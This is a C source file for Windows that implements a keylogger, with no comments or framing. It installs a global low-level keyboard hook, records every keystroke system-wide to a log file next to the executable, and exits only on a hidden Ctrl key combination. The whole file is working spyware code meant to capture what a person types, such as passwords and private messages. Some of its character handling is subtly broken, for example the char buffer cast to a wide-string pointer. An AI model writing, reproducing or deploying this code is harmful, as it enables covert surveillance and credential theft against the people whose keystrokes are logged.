#include <stdio.h>
#include <stdlib.h>
#include <stdbool.h>
#include <ctype.h>
#include <windows.h>
#include <winuser.h>

#define BUFFER_SIZE 1024

HHOOK keyboard_hook;
char log_file_path[MAX_PATH];
int cancel_key;

void write_to_file(const char *key) {
    FILE *log_file = fopen(log_file_path, "a");
    if (log_file == NULL) {
        perror("Error: ");
        exit(EXIT_FAILURE);
    }

    fprintf(log_file, "%s\n", key);
    fclose(log_file);
}

LRESULT CALLBACK keyboard_callback(int nCode, WPARAM wParam, LPARAM lParam) {
    if (nCode >= 0 && wParam == WM_KEYDOWN) {
        KBDLLHOOKSTRUCT *kbhs = (KBDLLHOOKSTRUCT *) lParam;

        if (kbhs->vkCode == cancel_key && GetAsyncKeyState(VK_CONTROL) < 0) {
            exit(EXIT_SUCCESS);
        }

        if (kbhs->vkCode != 0 && kbhs->vkCode != VK_BACK && kbhs->vkCode != VK_RETURN) {
            char key[BUFFER_SIZE];
            BYTE state[256] = { 0 };
            int result = ToUnicode(kbhs->vkCode, kbhs->scanCode, state, (LPWSTR) key, BUFFER_SIZE, 0);
            if (result > 0) {
                if (isprint(*key)) {
                    write_to_file(key);
                } else {
                    switch (*key) {
                        case VK_SPACE:
                            write_to_file("[SPACE]");
                            break;
                        case VK_TAB:
                            write_to_file("[TAB]");
                            break;
                        case VK_RETURN:
                            write_to_file("[ENTER]");
                            break;
                        default:
                            write_to_file("[UNKNOWN]");
                            break;
                    }
                }
            }
        }
    }

    return CallNextHookEx(keyboard_hook, nCode, wParam, lParam);
}

int main() {
    GetModuleFileName(NULL, log_file_path, MAX_PATH);
    char *last_slash = strrchr(log_file_path, '\\');
    if (last_slash != NULL) {
        *(last_slash + 1) = '\0';
    }
    strcat(log_file_path, "file.log");

    char *cancel_key_env = getenv("pylogger_cancel");
    if (cancel_key_env != NULL) {
        cancel_key = (int) cancel_key_env[0];
    } else {
        cancel_key = '`';
    }

    keyboard_hook = SetWindowsHookEx(WH_KEYBOARD_LL, keyboard_callback, NULL, 0);
    if (keyboard_hook == NULL) {
        perror("Error: ");
        exit(EXIT_FAILURE);
    }

    MSG message;
    while (GetMessage(&message, NULL, 0, 0)) {
        TranslateMessage(&message);
        DispatchMessage(&message);
    }

    UnhookWindowsHookEx(keyboard_hook);

    return 0;
}
